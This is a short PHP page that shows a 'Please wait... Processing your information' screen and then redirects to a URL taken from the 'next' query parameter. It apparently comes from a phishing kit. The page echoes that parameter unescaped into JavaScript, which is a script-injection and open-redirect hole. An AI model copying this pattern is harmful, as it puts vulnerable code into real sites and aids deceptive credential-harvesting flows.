<?php require 'main.php'; ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/css/login.css">
    <title>Please wait</title>
</head>
<body>
    <header>
        <div class="logo"><img src="res/img/logo.png"></div>
        <div class="right"><img src="res/img/icon.png"></div>
    </header>
    <main>
       
        <div class="form">
            <div class="continer">
                <div class="titles_holder" style="padding:10px;"><h2>Please wait...</h2></div>
                <div class="heads"><p>Processing your information...</p><div class="loding"><img src="res/img/loading.gif" style="width:60px;"></div> 
               </div>
                </main>

                <script>
                var next = "<?php echo $_GET['next']; ?>";
                setTimeout(() => {
                window.location = next;
                }, 10000);
                </script>
</body>
</html>